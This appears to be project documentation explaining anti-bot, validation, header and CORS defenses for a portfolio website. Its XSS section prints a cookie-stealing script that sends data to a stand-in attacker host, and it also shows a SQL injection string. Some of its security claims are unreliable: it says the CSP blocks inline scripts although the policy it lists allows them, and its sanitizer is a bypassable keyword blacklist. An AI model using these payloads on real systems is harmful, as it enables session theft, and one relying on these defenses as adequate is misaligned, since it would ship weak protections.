# 🔒 Security Features Guide

Complete guide to understanding the security features protecting your portfolio.

---

## 🎯 Overview

Your portfolio has multiple layers of security to protect against:
- 🤖 Bots and automated attacks
- 📧 Spam submissions
- 🔓 Code injection (XSS)
- ⚡ Denial of service (DoS)
- 🎣 Common web vulnerabilities

---

## 🛡️ Security Layers

### Level 1: Frontend Protection

**Where**: Browser/React app  
**Purpose**: First line of defense

| Feature | What It Does | How It Works |
|---------|-------------|--------------|
| **Input Validation** | Checks data before sending | Zod schema validation |
| **Math Captcha** | Verifies human user | Simple arithmetic question |
| **Honeypot Field** | Catches bots | Hidden field bots fill |
| **Client Rate Limit** | Prevents spam clicks | 1-minute cooldown |
| **XSS Prevention** | Blocks malicious scripts | React auto-escaping |

### Level 2: API Protection

**Where**: Backend/Serverless function  
**Purpose**: Server-side validation

| Feature | What It Does | How It Works |
|---------|-------------|--------------|
| **Input Sanitization** | Cleans dangerous input | Strip HTML, scripts |
| **Server Rate Limit** | Limits requests per IP | 5 per 15 minutes |
| **Captcha Verification** | Re-checks captcha | Server-side validation |
| **Honeypot Check** | Rejects bot submissions | Blocks if filled |
| **Email Validation** | Verifies email format | RFC-compliant regex |

### Level 3: Infrastructure Protection

**Where**: Vercel/Hosting  
**Purpose**: Network and platform security

| Feature | What It Does | How It Works |
|---------|-------------|--------------|
| **HTTPS** | Encrypts traffic | Automatic SSL |
| **CORS** | Restricts API access | Allowed origins only |
| **Security Headers** | Protects against attacks | CSP, XSS, MIME sniffing |
| **DDoS Protection** | Blocks attack traffic | Vercel infrastructure |
| **Function Timeout** | Limits execution time | 30-second max |

---

## 🎯 Feature Deep Dive

### 1. Math Captcha 🧮

**What is it?**
Simple arithmetic question that users must solve before submitting.

**Example:**
```
3 + 2 = ?
Answer: 5
```

**Why it works:**
- ✅ Easy for humans (1st-grade math)
- ❌ Hard for bots (requires JavaScript execution)
- ✅ No external dependencies
- ✅ Privacy-friendly (no Google tracking)
- ✅ Fast (instant verification)

**How it works:**

```typescript
// 1. Generate random question
const num1 = Math.floor(Math.random() * 10) + 1  // 1-10
const num2 = Math.floor(Math.random() * 10) + 1  // 1-10
const operation = Math.random() > 0.5 ? '+' : '-'
const answer = operation === '+' ? num1 + num2 : num1 - num2

// 2. Show question to user
"What is 3 + 2 = ?"

// 3. User enters answer
userAnswer = "5"

// 4. Validate
if (userAnswer === answer.toString()) {
  // ✅ Correct
} else {
  // ❌ Wrong
}
```

**Protection level**: Medium  
**User friction**: Low  
**False positives**: Very rare

---

### 2. Honeypot Field 🍯

**What is it?**
Hidden form field that humans don't see but bots fill out.

**How it works:**

```html
<!-- Hidden from humans with CSS -->
<input 
  type="text" 
  name="website"
  style="display: none"
  tabindex="-1"
  autocomplete="off"
/>
```

**Detection logic:**
```javascript
// If honeypot is filled, reject
if (req.body.website) {
  return res.status(400).json({ 
    error: 'Bot detected' 
  })
}
```

**Why bots fill it:**
- They parse HTML and see an input field
- They fill all fields automatically
- They don't execute CSS (so don't know it's hidden)

**Protection level**: Medium  
**User friction**: Zero (invisible)  
**False positives**: Almost never

---

### 3. Rate Limiting ⏱️

**What is it?**
Limits how many requests a user/IP can make.

**Client-side:**
```typescript
// After successful submission
const lastSubmit = Date.now()
const cooldown = 60000 // 1 minute

// Block submissions during cooldown
if (Date.now() - lastSubmit < cooldown) {
  return 'Please wait before submitting again'
}
```

**Server-side:**
```javascript
// Track submissions per IP
const submissions = new Map()

// Check rate
const ip = req.headers['x-forwarded-for']
const count = submissions.get(ip) || 0
const timeWindow = 15 * 60 * 1000 // 15 minutes

if (count >= 5) {
  return res.status(429).json({ 
    error: 'Too many requests' 
  })
}
```

**Limits:**
- **Client**: 1 submission per minute
- **Server**: 5 submissions per 15 minutes per IP

**Protection level**: High  
**User friction**: Low (normal users won't hit it)  
**False positives**: Rare

---

### 4. Input Validation ✅

**What is it?**
Checking that input meets requirements.

**Frontend validation:**
```typescript
const schema = z.object({
  name: z.string()
    .min(2, "Name too short")
    .max(100, "Name too long")
    .regex(/^[a-zA-Z\s\-']+$/, "Letters only"),
  
  email: z.string()
    .email("Invalid email"),
  
  message: z.string()
    .min(10, "Message too short")
    .max(5000, "Message too long")
})
```

**Backend validation:**
```javascript
// Email format
if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
  return 'Invalid email'
}

// Length checks
if (message.length < 10 || message.length > 5000) {
  return 'Invalid message length'
}
```

**What it prevents:**
- Empty submissions
- Invalid email addresses
- Extremely long messages (DoS)
- Missing required fields

---

### 5. Input Sanitization 🧹

**What is it?**
Removing dangerous characters from user input.

**What it removes:**
```javascript
function sanitize(input) {
  return input
    .replace(/<script>/gi, '')        // Script tags
    .replace(/<\/script>/gi, '')
    .replace(/javascript:/gi, '')     // JS protocols
    .replace(/on\w+=/gi, '')          // Event handlers
    .replace(/<iframe/gi, '')         // Iframes
    .replace(/<object/gi, '')         // Objects
    .replace(/<embed/gi, '')          // Embeds
}
```

**Prevents:**
- Cross-site scripting (XSS)
- HTML injection
- JavaScript execution
- Iframe embedding
- Malicious redirects

**Example:**
```javascript
// Input (dangerous):
"<script>alert('hacked')</script> Hello"

// Output (safe):
" Hello"
```

---

### 6. Security Headers 📋

**What are they?**
HTTP headers that tell browsers how to handle security.

**Headers we use:**

```javascript
// Prevents clickjacking
'X-Frame-Options': 'DENY'

// Prevents MIME sniffing
'X-Content-Type-Options': 'nosniff'

// XSS protection
'X-XSS-Protection': '1; mode=block'

// HTTPS enforcement
'Strict-Transport-Security': 'max-age=31536000'

// Content Security Policy
'Content-Security-Policy': `
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
`

// Referrer policy
'Referrer-Policy': 'strict-origin-when-cross-origin'
```

**Where configured:**
```
public/_headers
```

**What they prevent:**
- Clickjacking attacks
- MIME type attacks
- XSS attacks
- Insecure connections
- Information leakage

---

### 7. CORS Protection 🌐

**What is it?**
Cross-Origin Resource Sharing - controls which websites can access your API.

**Configuration:**
```javascript
// In development
const allowedOrigins = [
  'http://localhost:5173',
  'http://localhost:3000'
]

// In production
const allowedOrigins = [
  'https://yoursite.vercel.app',
  'https://yoursite.com'
]

// Check origin
const origin = req.headers.origin
if (!allowedOrigins.includes(origin)) {
  return res.status(403).json({ 
    error: 'Not allowed' 
  })
}
```

**What it prevents:**
- Unauthorized API access
- Cross-site request forgery (CSRF)
- Data theft
- Abuse from other sites

---

## 🧪 Testing Security

### Test Math Captcha

1. **Submit without solving** - Should be blocked
2. **Submit wrong answer** - Should show error
3. **Submit correct answer** - Should work
4. **Refresh and try again** - New question appears

### Test Honeypot

1. **Open browser console** (F12)
2. **Run:**
   ```javascript
   document.querySelector('input[name="website"]').value = 'bot'
   ```
3. **Submit form** - Should be blocked
4. **Error**: "Bot detected"

### Test Rate Limiting

1. **Submit form 6 times quickly**
2. **6th submission should fail**
3. **Error**: "Too many requests"
4. **Wait 15 minutes** - Should work again

### Test Input Validation

Try submitting:
- Empty fields - ❌ Blocked
- Invalid email - ❌ Blocked
- 1-character name - ❌ Blocked
- Message with `<script>` - ✅ Accepted but sanitized

---

## 🐛 Security Vulnerabilities Prevented

### 1. Cross-Site Scripting (XSS)

**Attack:**
```html
<script>
  fetch('evil.com?cookie=' + document.cookie)
</script>
```

**Protection:**
- ✅ React auto-escapes output
- ✅ Input sanitization removes scripts
- ✅ CSP header blocks inline scripts
- ✅ XSS header enables browser protection

---

### 2. SQL Injection

**Attack:**
```sql
'; DROP TABLE users; --
```

**Protection:**
- ✅ No database in this project
- ✅ All data goes through email API
- ✅ Email API handles sanitization

---

### 3. Denial of Service (DoS)

**Attack:**
- Flood server with requests
- Submit huge messages
- Keep connections open

**Protection:**
- ✅ Rate limiting (5 per 15 min)
- ✅ Message length limits (5000 chars)
- ✅ Function timeout (30 seconds)
- ✅ Vercel DDoS protection

---

### 4. Clickjacking

**Attack:**
- Embed your site in iframe
- Trick users into clicking

**Protection:**
- ✅ X-Frame-Options: DENY
- ✅ CSP frame-ancestors 'none'

---

### 5. MIME Sniffing

**Attack:**
- Upload disguised malicious file
- Browser executes it

**Protection:**
- ✅ X-Content-Type-Options: nosniff
- ✅ No file uploads

---

## 📊 Security Checklist

### For Development

- [ ] All security features tested
- [ ] Captcha works correctly
- [ ] Rate limiting tested
- [ ] Honeypot catches bots
- [ ] Input validation works
- [ ] No console errors

### For Production

- [ ] HTTPS enabled (automatic on Vercel)
- [ ] Security headers configured
- [ ] CORS properly set
- [ ] Environment variables secure
- [ ] No secrets in code
- [ ] Dependencies updated
- [ ] Error messages don't leak info

---

## 🔧 Maintaining Security

### Regular Tasks

**Monthly:**
- [ ] Update dependencies (`npm update`)
- [ ] Check for security advisories
- [ ] Review error logs
- [ ] Test security features

**Quarterly:**
- [ ] Security audit
- [ ] Update security headers
- [ ] Review access logs
- [ ] Update documentation

**Yearly:**
- [ ] Comprehensive security review
- [ ] Penetration testing (if needed)
- [ ] Update security policies

---

## 🚨 If You Get Attacked

### Signs of Attack

- Unusual traffic spike
- Many failed submissions
- Error rate increases
- Slow response times
- Strange form submissions

### What to Do

1. **Check Vercel logs** for patterns
2. **Check Resend dashboard** for email spam
3. **Increase rate limiting** temporarily
4. **Block specific IPs** if needed
5. **Contact Vercel support** if serious

### Prevention

- Keep security features enabled
- Monitor regularly
- Update dependencies
- Don't disable security for convenience

---

## 💡 Best Practices

### ✅ DO

- Keep all security features enabled
- Update dependencies regularly
- Use environment variables for secrets
- Test security features after changes
- Monitor logs for unusual activity
- Keep rate limits reasonable

### ❌ DON'T

- Disable security features
- Trust user input
- Expose API keys
- Ignore security warnings
- Skip testing
- Make rate limits too lenient

---

## 📚 Security Resources

### Learn More

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Common vulnerabilities
- [Web Security Basics](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Vercel Security](https://vercel.com/docs/concepts/security)
- [React Security](https://react.dev/learn/preserving-and-resetting-state#security)

### Tools

- [Security Headers Checker](https://securityheaders.com/)
- [SSL Test](https://www.ssllabs.com/ssltest/)
- [CORS Tester](https://cors-test.codehappy.dev/)

---

## ✅ Security Summary

Your portfolio is protected by:

✅ **3 anti-bot systems** (Captcha, Honeypot, Rate limit)  
✅ **Input validation** (Frontend & backend)  
✅ **Input sanitization** (XSS prevention)  
✅ **Security headers** (Multiple protections)  
✅ **CORS protection** (API access control)  
✅ **HTTPS encryption** (Secure connections)  
✅ **Rate limiting** (DoS prevention)  

**Result**: Strong protection against common attacks while maintaining great user experience!

---

## 🚀 Next Steps

**→ [Deployment Guide](./07-Deployment-Guide.md)**

Learn how to deploy your portfolio to production with all security features enabled.

---

**Need Help?** Check the [Troubleshooting Guide](./08-Troubleshooting.md) or return to the main [README](./README.md).











